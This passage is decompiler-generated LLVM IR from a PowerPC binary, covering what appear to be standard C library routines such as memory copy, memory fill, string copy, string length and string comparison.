  %v2_10006dac = inttoptr i32 %v1_10006dac to i32*
  %v3_10006dac = load i32, i32* %v2_10006dac, align 4
  store i32 %v3_10006dac, i32* %r9.global-to-local, align 4
  store i32 %v1_10006dac, i32* %r4.global-to-local, align 4
  %v2_10006db0 = add i32 %v1_10006db0, 4
  %v3_10006db0 = inttoptr i32 %v2_10006db0 to i32*
  store i32 %v3_10006da8, i32* %v3_10006db0, align 4
  %v0_10006db4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006db4 = load i32, i32* @r11, align 4
  %v2_10006db4 = add i32 %v1_10006db4, 8
  %v3_10006db4 = inttoptr i32 %v2_10006db4 to i32*
  store i32 %v0_10006db4, i32* %v3_10006db4, align 4
  store i32 %v2_10006db4, i32* @r11, align 4
  %v0_10006db8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006db8 = add i32 %v0_10006db8, -1
  store i32 %v1_10006db8, i32* %ctr.global-to-local, align 4
  %v2_10006db8 = icmp eq i32 %v1_10006db8, 0
  br i1 %v2_10006db8, label %dec_label_pc_10006dbc, label %dec_label_pc_10006da8

dec_label_pc_10006dbc:                            ; preds = %dec_label_pc_10006da8, %dec_label_pc_10006e18, %dec_label_pc_10006d8c
  %.1 = phi i32 [ undef, %dec_label_pc_10006d8c ], [ %v2_10006e00, %dec_label_pc_10006e18 ], [ %.0, %dec_label_pc_10006da8 ]
  %v1_10006dbc = urem i32 %.1, 8
  store i32 %v1_10006dbc, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10006dbc, 4
  br i1 %tmp, label %dec_label_pc_10006dd4, label %dec_label_pc_10006dc8

dec_label_pc_10006dc8:                            ; preds = %dec_label_pc_10006dbc
  %v0_10006dc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10006dc8 = add i32 %v0_10006dc8, 4
  %v2_10006dc8 = inttoptr i32 %v1_10006dc8 to i32*
  %v3_10006dc8 = load i32, i32* %v2_10006dc8, align 4
  store i32 %v1_10006dc8, i32* %r4.global-to-local, align 4
  %v1_10006dcc = add nsw i32 %v1_10006dbc, -4
  store i32 %v1_10006dcc, i32* @r5, align 4
  %v1_10006dd0 = load i32, i32* @r11, align 4
  %v2_10006dd0 = add i32 %v1_10006dd0, 4
  %v3_10006dd0 = inttoptr i32 %v2_10006dd0 to i32*
  store i32 %v3_10006dc8, i32* %v3_10006dd0, align 4
  store i32 %v2_10006dd0, i32* @r11, align 4
  %v0_10006dd4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10006dd4

dec_label_pc_10006dd4:                            ; preds = %dec_label_pc_10006dbc, %dec_label_pc_10006dc8
  %v0_10006dd4 = phi i32 [ %v1_10006dbc, %dec_label_pc_10006dbc ], [ %v0_10006dd4.pre, %dec_label_pc_10006dc8 ]
  %v3_10006dd4 = icmp eq i32 %v0_10006dd4, 0
  %v0_10006dd8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10006dd4, i32 %v0_10006dd8)
  %v0_10006ddc = load i32, i32* @r5, align 4
  store i32 %v0_10006ddc, i32* %ctr.global-to-local, align 4
  %v0_10006de0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10006de0 = add i32 %v0_10006de0, 3
  store i32 %v1_10006de0, i32* %r4.global-to-local, align 4
  %v0_10006de4 = load i32, i32* @r11, align 4
  %v1_10006de4 = add i32 %v0_10006de4, 3
  store i32 %v1_10006de4, i32* %r9.global-to-local, align 4
  %v1_10006de89 = add i32 %v0_10006de0, 4
  %v2_10006de810 = inttoptr i32 %v1_10006de89 to i8*
  %v3_10006de811 = load i8, i8* %v2_10006de810, align 1
  store i32 %v1_10006de89, i32* %r4.global-to-local, align 4
  %v3_10006dec13 = add i32 %v0_10006de4, 4
  %v4_10006dec14 = inttoptr i32 %v3_10006dec13 to i8*
  store i8 %v3_10006de811, i8* %v4_10006dec14, align 1
  store i32 %v3_10006dec13, i32* %r9.global-to-local, align 4
  %v0_10006df015 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006df016 = add i32 %v0_10006df015, -1
  store i32 %v1_10006df016, i32* %ctr.global-to-local, align 4
  %v2_10006df017 = icmp eq i32 %v1_10006df016, 0
  br i1 %v2_10006df017, label %dec_label_pc_10006e24, label %dec_label_pc_10006de8.dec_label_pc_10006de8_crit_edge

dec_label_pc_10006de8.dec_label_pc_10006de8_crit_edge: ; preds = %dec_label_pc_10006dd4, %dec_label_pc_10006de8.dec_label_pc_10006de8_crit_edge
  %v3_10006dec18 = phi i32 [ %v3_10006dec, %dec_label_pc_10006de8.dec_label_pc_10006de8_crit_edge ], [ %v3_10006dec13, %dec_label_pc_10006dd4 ]
  %v0_10006de8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10006de8 = add i32 %v0_10006de8.pre, 1
  %v2_10006de8 = inttoptr i32 %v1_10006de8 to i8*
  %v3_10006de8 = load i8, i8* %v2_10006de8, align 1
  store i32 %v1_10006de8, i32* %r4.global-to-local, align 4
  %v3_10006dec = add i32 %v3_10006dec18, 1
  %v4_10006dec = inttoptr i32 %v3_10006dec to i8*
  store i8 %v3_10006de8, i8* %v4_10006dec, align 1
  store i32 %v3_10006dec, i32* %r9.global-to-local, align 4
  %v0_10006df0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006df0 = add i32 %v0_10006df0, -1
  store i32 %v1_10006df0, i32* %ctr.global-to-local, align 4
  %v2_10006df0 = icmp eq i32 %v1_10006df0, 0
  br i1 %v2_10006df0, label %dec_label_pc_10006e24, label %dec_label_pc_10006de8.dec_label_pc_10006de8_crit_edge

dec_label_pc_10006df8:                            ; preds = %dec_label_pc_10006d9c
  %v1_10006df8 = sub nsw i32 4, %v1_10006d9c
  store i32 %v1_10006df8, i32* %ctr.global-to-local, align 4
  %v1_10006e00 = load i32, i32* @r5, align 4
  %v2_10006e00 = sub i32 %v1_10006e00, %v1_10006df8
  br label %dec_label_pc_10006e04

dec_label_pc_10006e04:                            ; preds = %dec_label_pc_10006e04.dec_label_pc_10006e04_crit_edge, %dec_label_pc_10006df8
  %v2_10006e0c = phi i32 [ %v1_10006e10, %dec_label_pc_10006e04.dec_label_pc_10006e04_crit_edge ], [ %v1_10006d94, %dec_label_pc_10006df8 ]
  %v0_10006e04 = phi i32 [ %v0_10006e04.pre, %dec_label_pc_10006e04.dec_label_pc_10006e04_crit_edge ], [ %v1_10006d90, %dec_label_pc_10006df8 ]
  %v1_10006e04 = add i32 %v0_10006e04, 4
  %v2_10006e04 = inttoptr i32 %v1_10006e04 to i8*
  %v3_10006e04 = load i8, i8* %v2_10006e04, align 1
  %v1_10006e08 = add i32 %v0_10006e04, 1
  store i32 %v1_10006e08, i32* %r4.global-to-local, align 4
  %v3_10006e0c = add i32 %v2_10006e0c, 4
  %v4_10006e0c = inttoptr i32 %v3_10006e0c to i8*
  store i8 %v3_10006e04, i8* %v4_10006e0c, align 1
  %v0_10006e10 = load i32, i32* @r11, align 4
  %v1_10006e10 = add i32 %v0_10006e10, 1
  store i32 %v1_10006e10, i32* @r11, align 4
  %v0_10006e14 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006e14 = add i32 %v0_10006e14, -1
  store i32 %v1_10006e14, i32* %ctr.global-to-local, align 4
  %v2_10006e14 = icmp eq i32 %v1_10006e14, 0
  br i1 %v2_10006e14, label %dec_label_pc_10006e18, label %dec_label_pc_10006e04.dec_label_pc_10006e04_crit_edge

dec_label_pc_10006e04.dec_label_pc_10006e04_crit_edge: ; preds = %dec_label_pc_10006e04
  %v0_10006e04.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10006e04

dec_label_pc_10006e18:                            ; preds = %dec_label_pc_10006e04
  %v1_10006e18 = call i32 @__asm_rlwinm.(i32 %v2_10006e00, i32 29, i32 3, i32 31)
  store i32 %v1_10006e18, i32* %r9.global-to-local, align 4
  %v4_10006e18 = icmp eq i32 %v1_10006e18, 0
  br i1 %v4_10006e18, label %dec_label_pc_10006dbc, label %dec_label_pc_10006e18.dec_label_pc_10006da4_crit_edge

dec_label_pc_10006e18.dec_label_pc_10006da4_crit_edge: ; preds = %dec_label_pc_10006e18
  %v1_10006db0.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10006da4

dec_label_pc_10006e24:                            ; preds = %dec_label_pc_10006de8.dec_label_pc_10006de8_crit_edge, %dec_label_pc_10006dd4
  %v0_10006e24 = load i32, i32* @r3, align 4
  ret i32 %v0_10006e24

; uselistorder directives
  uselistorder i32 %v1_10006e18, { 1, 2, 0 }
  uselistorder i32 %v1_10006e14, { 1, 0 }
  uselistorder i32 %v1_10006e10, { 1, 0 }
  uselistorder i32 %v0_10006e04, { 1, 0 }
  uselistorder i32 %v2_10006e00, { 2, 1, 0 }
  uselistorder i32 %v1_10006df0, { 1, 0 }
  uselistorder i32 %v3_10006dec, { 1, 2, 0 }
  uselistorder i32 %v1_10006dbc, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10006db8, { 1, 0 }
  uselistorder i32 %v2_10006db4, { 1, 2, 0 }
  uselistorder i32 %v1_10006d9c, { 1, 0 }
  uselistorder i32 %v1_10006d94, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006de8.dec_label_pc_10006de8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10006dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10006dbc, { 1, 0, 2 }
}

define i32 @function_10006e28(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006e28:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10006e28 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_10006e28, i32* %r9.global-to-local, align 4
  %v4_10006e28 = icmp eq i32 %v1_10006e28, 0
  %v1_10006e30 = add i32 %arg1, -4
  store i32 %v1_10006e30, i32* %r11.global-to-local, align 4
  %v1_10006e34 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_10006e38 = call i32 @__asm_rlwimi(i32 %v1_10006e34, i32 16, i32 0, i32 15)
  %v2_10006e38 = trunc i32 %v1_10006e38 to i8
  br i1 %v4_10006e28, label %dec_label_pc_10006e60, label %dec_label_pc_10006e40

dec_label_pc_10006e40:                            ; preds = %dec_label_pc_10006e28
  %v0_10006e40 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006e40 = urem i32 %v0_10006e40, 4
  %v3_10006e40 = icmp eq i32 %v1_10006e40, 0
  br i1 %v3_10006e40, label %dec_label_pc_10006e40.dec_label_pc_10006e48_crit_edge, label %dec_label_pc_10006e90

dec_label_pc_10006e40.dec_label_pc_10006e48_crit_edge: ; preds = %dec_label_pc_10006e40
  %v0_10006e48.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10006e48

dec_label_pc_10006e48:                            ; preds = %dec_label_pc_10006ea8.dec_label_pc_10006e48_crit_edge, %dec_label_pc_10006e40.dec_label_pc_10006e48_crit_edge
  %v0_10006e4c.pre = phi i32 [ %v0_10006e40, %dec_label_pc_10006e40.dec_label_pc_10006e48_crit_edge ], [ %v0_10006e4c.pre.pre, %dec_label_pc_10006ea8.dec_label_pc_10006e48_crit_edge ]
  %v0_10006e48 = phi i32 [ %v0_10006e48.pre, %dec_label_pc_10006e40.dec_label_pc_10006e48_crit_edge ], [ %v1_10006ea8, %dec_label_pc_10006ea8.dec_label_pc_10006e48_crit_edge ]
  store i32 %v0_10006e48, i32* %ctr.global-to-local, align 4
  %v1_10006e50 = sext i8 %v2_10006e38 to i32
  br label %dec_label_pc_10006e4c

dec_label_pc_10006e4c:                            ; preds = %dec_label_pc_10006e4c, %dec_label_pc_10006e48
  %v0_10006e4c = phi i32 [ %v1_10006e58, %dec_label_pc_10006e4c ], [ %v0_10006e4c.pre, %dec_label_pc_10006e48 ]
  %v1_10006e4c = add i32 %v0_10006e4c, 4
  store i32 %v1_10006e4c, i32* %r9.global-to-local, align 4
  %v4_10006e50 = inttoptr i32 %v1_10006e4c to i32*
  store i32 %v1_10006e50, i32* %v4_10006e50, align 4
  %v2_10006e54 = load i32, i32* %r9.global-to-local, align 4
  %v3_10006e54 = add i32 %v2_10006e54, 4
  %v4_10006e54 = inttoptr i32 %v3_10006e54 to i32*
  store i32 %v1_10006e50, i32* %v4_10006e54, align 4
  %v0_10006e58 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006e58 = add i32 %v0_10006e58, 4
  store i32 %v1_10006e58, i32* %r11.global-to-local, align 4
  %v0_10006e5c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006e5c = add i32 %v0_10006e5c, -1
  store i32 %v1_10006e5c, i32* %ctr.global-to-local, align 4
  %v2_10006e5c = icmp eq i32 %v1_10006e5c, 0
  br i1 %v2_10006e5c, label %dec_label_pc_10006e60, label %dec_label_pc_10006e4c

dec_label_pc_10006e60:                            ; preds = %dec_label_pc_10006e4c, %dec_label_pc_10006ea8, %dec_label_pc_10006e28
  %v0_10006e60 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006e60 = urem i32 %v0_10006e60, 8
  store i32 %v1_10006e60, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10006e60, 4
  br i1 %tmp, label %dec_label_pc_10006e74, label %dec_label_pc_10006e6c

dec_label_pc_10006e6c:                            ; preds = %dec_label_pc_10006e60
  %v1_10006e6c = sext i8 %v2_10006e38 to i32
  %v2_10006e6c = load i32, i32* %r11.global-to-local, align 4
  %v3_10006e6c = add i32 %v2_10006e6c, 4
  %v4_10006e6c = inttoptr i32 %v3_10006e6c to i32*
  store i32 %v1_10006e6c, i32* %v4_10006e6c, align 4
  store i32 %v3_10006e6c, i32* %r11.global-to-local, align 4
  %v0_10006e70 = load i32, i32* @r5, align 4
  %v1_10006e70 = add i32 %v0_10006e70, -4
  store i32 %v1_10006e70, i32* @r5, align 4
  br label %dec_label_pc_10006e74

dec_label_pc_10006e74:                            ; preds = %dec_label_pc_10006e60, %dec_label_pc_10006e6c
  %v0_10006e74 = phi i32 [ %v1_10006e60, %dec_label_pc_10006e60 ], [ %v1_10006e70, %dec_label_pc_10006e6c ]
  %v3_10006e74 = icmp eq i32 %v0_10006e74, 0
  %v0_10006e78 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10006e74, i32 %v0_10006e78)
  %v0_10006e7c = load i32, i32* @r5, align 4
  store i32 %v0_10006e7c, i32* %ctr.global-to-local, align 4
  %v0_10006e80 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006e80 = add i32 %v0_10006e80, 3
  store i32 %v1_10006e80, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10006e84

dec_label_pc_10006e84:                            ; preds = %dec_label_pc_10006e84, %dec_label_pc_10006e74
  %v3_10006e84 = phi i32 [ %v4_10006e84, %dec_label_pc_10006e84 ], [ %v1_10006e80, %dec_label_pc_10006e74 ]
  %v4_10006e84 = add i32 %v3_10006e84, 1
  %v5_10006e84 = inttoptr i32 %v4_10006e84 to i8*
  store i8 %v2_10006e38, i8* %v5_10006e84, align 1
  store i32 %v4_10006e84, i32* %r9.global-to-local, align 4
  %v0_10006e88 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006e88 = add i32 %v0_10006e88, -1
  store i32 %v1_10006e88, i32* %ctr.global-to-local, align 4
  %v2_10006e88 = icmp eq i32 %v1_10006e88, 0
  br i1 %v2_10006e88, label %dec_label_pc_10006eb4, label %dec_label_pc_10006e84

dec_label_pc_10006e90:                            ; preds = %dec_label_pc_10006e40
  %v1_10006e90 = sub nsw i32 4, %v1_10006e40
  store i32 %v1_10006e90, i32* %ctr.global-to-local, align 4
  %v1_10006e98 = load i32, i32* %r5.global-to-local, align 4
  %v2_10006e98 = sub i32 %v1_10006e98, %v1_10006e90
  store i32 %v2_10006e98, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10006e9c

dec_label_pc_10006e9c:                            ; preds = %dec_label_pc_10006e9c, %dec_label_pc_10006e90
  %v3_10006e9c = phi i32 [ %v1_10006ea0, %dec_label_pc_10006e9c ], [ %v0_10006e40, %dec_label_pc_10006e90 ]
  %v4_10006e9c = add i32 %v3_10006e9c, 4
  %v5_10006e9c = inttoptr i32 %v4_10006e9c to i8*
  store i8 %v2_10006e38, i8* %v5_10006e9c, align 1
  %v0_10006ea0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006ea0 = add i32 %v0_10006ea0, 1
  store i32 %v1_10006ea0, i32* %r11.global-to-local, align 4
  %v0_10006ea4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006ea4 = add i32 %v0_10006ea4, -1
  store i32 %v1_10006ea4, i32* %ctr.global-to-local, align 4
  %v2_10006ea4 = icmp eq i32 %v1_10006ea4, 0
  br i1 %v2_10006ea4, label %dec_label_pc_10006ea8, label %dec_label_pc_10006e9c

dec_label_pc_10006ea8:                            ; preds = %dec_label_pc_10006e9c
  %v0_10006ea8 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006ea8 = call i32 @__asm_rlwinm.(i32 %v0_10006ea8, i32 29, i32 3, i32 31)
  store i32 %v1_10006ea8, i32* %r9.global-to-local, align 4
  %v4_10006ea8 = icmp eq i32 %v1_10006ea8, 0
  br i1 %v4_10006ea8, label %dec_label_pc_10006e60, label %dec_label_pc_10006ea8.dec_label_pc_10006e48_crit_edge

dec_label_pc_10006ea8.dec_label_pc_10006e48_crit_edge: ; preds = %dec_label_pc_10006ea8
  %v0_10006e4c.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006e48

dec_label_pc_10006eb4:                            ; preds = %dec_label_pc_10006e84
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10006ea8, { 1, 2, 0 }
  uselistorder i32 %v1_10006ea4, { 1, 0 }
  uselistorder i32 %v1_10006ea0, { 1, 0 }
  uselistorder i32 %v1_10006e88, { 1, 0 }
  uselistorder i32 %v4_10006e84, { 1, 2, 0 }
  uselistorder i32 %v1_10006e60, { 2, 1, 0 }
  uselistorder i32 %v1_10006e5c, { 1, 0 }
  uselistorder i32 %v1_10006e58, { 1, 0 }
  uselistorder i32 %v1_10006e40, { 1, 0 }
  uselistorder i32 %v0_10006e40, { 2, 1, 0 }
  uselistorder i8 %v2_10006e38, { 0, 2, 3, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_10006e74, { 1, 0 }
  uselistorder label %dec_label_pc_10006e60, { 1, 0, 2 }
}

define i32 @function_10006eb8(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_10006eb8:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10006eb8 = add i32 %arg1, -1
  %v1_10006ebc = sub i32 %v2_10006eb8, %tmp
  store i32 %v1_10006ebc, i32* %r9.global-to-local, align 4
  %v2_10006ec04 = load i8, i8* %arg2, align 1
  %v1_10006ec46 = add i32 %tmp, 1
  store i32 %v1_10006ec46, i32* %r4.global-to-local, align 4
  %v3_10006ec88 = icmp eq i8 %v2_10006ec04, 0
  store i1 %v3_10006ec88, i1* %cr7_eq.global-to-local, align 1
  %v5_10006ecc9 = inttoptr i32 %arg1 to i8*
  store i8 %v2_10006ec04, i8* %v5_10006ecc9, align 1
  %v0_10006ed010 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10006ed010, label %dec_label_pc_10006ed4, label %dec_label_pc_10006ec0.dec_label_pc_10006ec0_crit_edge

dec_label_pc_10006ec0.dec_label_pc_10006ec0_crit_edge: ; preds = %dec_label_pc_10006eb8, %dec_label_pc_10006ec0.dec_label_pc_10006ec0_crit_edge
  %v0_10006ec0.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_10006ecc.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10006ec0 = inttoptr i32 %v0_10006ec0.pre to i8*
  %v2_10006ec0 = load i8, i8* %v1_10006ec0, align 1
  %v1_10006ec4 = add i32 %v0_10006ec0.pre, 1
  store i32 %v1_10006ec4, i32* %r4.global-to-local, align 4
  %v3_10006ec8 = icmp eq i8 %v2_10006ec0, 0
  store i1 %v3_10006ec8, i1* %cr7_eq.global-to-local, align 1
  %v4_10006ecc = add i32 %v1_10006ec4, %v2_10006ecc.pre
  %v5_10006ecc = inttoptr i32 %v4_10006ecc to i8*
  store i8 %v2_10006ec0, i8* %v5_10006ecc, align 1
  %v0_10006ed0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10006ed0, label %dec_label_pc_10006ed4, label %dec_label_pc_10006ec0.dec_label_pc_10006ec0_crit_edge

dec_label_pc_10006ed4:                            ; preds = %dec_label_pc_10006ec0.dec_label_pc_10006ec0_crit_edge, %dec_label_pc_10006eb8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006ec0.dec_label_pc_10006ec0_crit_edge, { 1, 0 }
}

define i32 @function_10006ed8() local_unnamed_addr {
dec_label_pc_10006ed8:
  %v0_10006ed8 = load i32, i32* @r3, align 4
  %v1_10006ef03 = urem i32 %v0_10006ed8, 4
  %v3_10006ef05 = icmp eq i32 %v1_10006ef03, 0
  br i1 %v3_10006ef05, label %dec_label_pc_10006ef8, label %dec_label_pc_10006ee0

dec_label_pc_10006ee0:                            ; preds = %dec_label_pc_10006ed8, %dec_label_pc_10006eec
  %v0_10006eec = phi i32 [ %v1_10006eec, %dec_label_pc_10006eec ], [ %v0_10006ed8, %dec_label_pc_10006ed8 ]
  %v1_10006ee0 = inttoptr i32 %v0_10006eec to i8*
  %v2_10006ee0 = load i8, i8* %v1_10006ee0, align 1
  %v3_10006ee4 = icmp eq i8 %v2_10006ee0, 0
  br i1 %v3_10006ee4, label %dec_label_pc_10006f2c, label %dec_label_pc_10006eec

dec_label_pc_10006eec:                            ; preds = %dec_label_pc_10006ee0
  %v1_10006eec = add i32 %v0_10006eec, 1
  %v1_10006ef0 = urem i32 %v1_10006eec, 4
  %v3_10006ef0 = icmp eq i32 %v1_10006ef0, 0
  br i1 %v3_10006ef0, label %dec_label_pc_10006ef8, label %dec_label_pc_10006ee0

dec_label_pc_10006ef8:                            ; preds = %dec_label_pc_10006eec, %dec_label_pc_10006ed8
  %v0_10006efc = phi i32 [ %v0_10006ed8, %dec_label_pc_10006ed8 ], [ %v1_10006eec, %dec_label_pc_10006eec ]
  br label %dec_label_pc_10006f04

dec_label_pc_10006f04:                            ; preds = %dec_label_pc_10006f64, %dec_label_pc_10006f04, %dec_label_pc_10006ef8
  %v1_10006f40 = phi i32 [ %v0_10006efc, %dec_label_pc_10006ef8 ], [ %v1_10006f08, %dec_label_pc_10006f04 ], [ %v1_10006f08, %dec_label_pc_10006f64 ]
  %v1_10006f04 = inttoptr i32 %v1_10006f40 to i32*
  %v2_10006f04 = load i32, i32* %v1_10006f04, align 4
  %v1_10006f08 = add i32 %v1_10006f40, 4
  %v1_10006f14 = add i32 %v2_10006f04, -16843009
  %v2_10006f18 = and i32 %v1_10006f14, -2139062144
  %v5_10006f18 = icmp eq i32 %v2_10006f18, 0
  br i1 %v5_10006f18, label %dec_label_pc_10006f04, label %dec_label_pc_10006f20

dec_label_pc_10006f20:                            ; preds = %dec_label_pc_10006f04
  %v2_10006f20 = inttoptr i32 %v1_10006f40 to i8*
  %v3_10006f20 = load i8, i8* %v2_10006f20, align 1
  %v3_10006f24 = icmp eq i8 %v3_10006f20, 0
  br i1 %v3_10006f24, label %dec_label_pc_10006f2c, label %dec_label_pc_10006f34

dec_label_pc_10006f2c:                            ; preds = %dec_label_pc_10006ee0, %dec_label_pc_10006f20
  %v1_10006f2c = phi i32 [ %v1_10006f40, %dec_label_pc_10006f20 ], [ %v0_10006eec, %dec_label_pc_10006ee0 ]
  %v2_10006f2c = sub i32 %v1_10006f2c, %v0_10006ed8
  ret i32 %v2_10006f2c

dec_label_pc_10006f34:                            ; preds = %dec_label_pc_10006f20
  %v1_10006f34 = add i32 %v1_10006f40, 1
  %v2_10006f34 = inttoptr i32 %v1_10006f34 to i8*
  %v3_10006f34 = load i8, i8* %v2_10006f34, align 1
  %v3_10006f38 = icmp eq i8 %v3_10006f34, 0
  br i1 %v3_10006f38, label %dec_label_pc_10006f40, label %dec_label_pc_10006f4c

dec_label_pc_10006f40:                            ; preds = %dec_label_pc_10006f34
  %v2_10006f40 = sub i32 %v1_10006f40, %v0_10006ed8
  %v1_10006f44 = add i32 %v2_10006f40, 1
  ret i32 %v1_10006f44

dec_label_pc_10006f4c:                            ; preds = %dec_label_pc_10006f34
  %v1_10006f4c = add i32 %v1_10006f40, 2
  %v2_10006f4c = inttoptr i32 %v1_10006f4c to i8*
  %v3_10006f4c = load i8, i8* %v2_10006f4c, align 1
  %v3_10006f50 = icmp eq i8 %v3_10006f4c, 0
  br i1 %v3_10006f50, label %dec_label_pc_10006f58, label %dec_label_pc_10006f64

dec_label_pc_10006f58:                            ; preds = %dec_label_pc_10006f4c
  %v2_10006f58 = sub i32 %v1_10006f40, %v0_10006ed8
  %v1_10006f5c = add i32 %v2_10006f58, 2
  ret i32 %v1_10006f5c

dec_label_pc_10006f64:                            ; preds = %dec_label_pc_10006f4c
  %v1_10006f64 = add i32 %v1_10006f40, 3
  %v2_10006f64 = inttoptr i32 %v1_10006f64 to i8*
  %v3_10006f64 = load i8, i8* %v2_10006f64, align 1
  %v3_10006f68 = icmp eq i8 %v3_10006f64, 0
  br i1 %v3_10006f68, label %dec_label_pc_10006f70, label %dec_label_pc_10006f04

dec_label_pc_10006f70:                            ; preds = %dec_label_pc_10006f64
  %v2_10006f70 = sub i32 %v1_10006f40, %v0_10006ed8
  %v1_10006f74 = add i32 %v2_10006f70, 3
  ret i32 %v1_10006f74

; uselistorder directives
  uselistorder i32 %v1_10006f08, { 1, 0 }
  uselistorder i32 %v1_10006f40, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_10006eec, { 1, 0, 2 }
  uselistorder i32 %v0_10006ed8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10006f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10006ee0, { 1, 0 }
}

define i32 @function_10006f7c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10006f7c:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp21 = icmp ult i32 %arg2, 4
  br i1 %tmp21, label %dec_label_pc_10007054, label %dec_label_pc_10006f90

dec_label_pc_10006f90:                            ; preds = %dec_label_pc_10006f7c
  %v1_10006f90 = udiv i32 %arg2, 4
  %v0_10006fa0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10006f98

dec_label_pc_10006f98:                            ; preds = %dec_label_pc_10007020, %dec_label_pc_10006f90
  %v0_10007020 = phi i32 [ %v1_10007020, %dec_label_pc_10007020 ], [ %v1_10006f90, %dec_label_pc_10006f90 ]
  %v0_10006fc0 = phi i32 [ %v1_10006fd8, %dec_label_pc_10007020 ], [ %v0_10006fa0.pre, %dec_label_pc_10006f90 ]
  %v0_10006fb8 = phi i32 [ %v1_10006fd4, %dec_label_pc_10007020 ], [ %tmp, %dec_label_pc_10006f90 ]
  %v1_10006f98 = inttoptr i32 %v0_10006fb8 to i8*
  %v2_10006f98 = load i8, i8* %v1_10006f98, align 1
  %v1_10006fa0 = inttoptr i32 %v0_10006fc0 to i8*
  %v2_10006fa0 = load i8, i8* %v1_10006fa0, align 1
  %v3_10006fa8 = icmp eq i8 %v2_10006f98, 0
  %v4_10006fac.not = icmp ne i8 %v2_10006f98, %v2_10006fa0
  %brmerge = or i1 %v3_10006fa8, %v4_10006fac.not
  br i1 %brmerge, label %dec_label_pc_10007000, label %dec_label_pc_10006fb8

dec_label_pc_10006fb8:                            ; preds = %dec_label_pc_10006f98
  %v1_10006fa4 = add i32 %v0_10006fc0, 1
  %v1_10006f9c = add i32 %v0_10006fb8, 1
  %v2_10006fb8 = inttoptr i32 %v1_10006f9c to i8*
  %v3_10006fb8 = load i8, i8* %v2_10006fb8, align 1
  %v2_10006fc0 = inttoptr i32 %v1_10006fa4 to i8*
  %v3_10006fc0 = load i8, i8* %v2_10006fc0, align 1
  %v3_10006fc8 = icmp eq i8 %v3_10006fb8, 0
  %v1_10006fcc = add i32 %v0_10006fb8, 3
  %v1_10006fd0 = add i32 %v0_10006fc0, 3
  %v1_10006fd4 = add i32 %v0_10006fb8, 4
  %v1_10006fd8 = add i32 %v0_10006fc0, 4
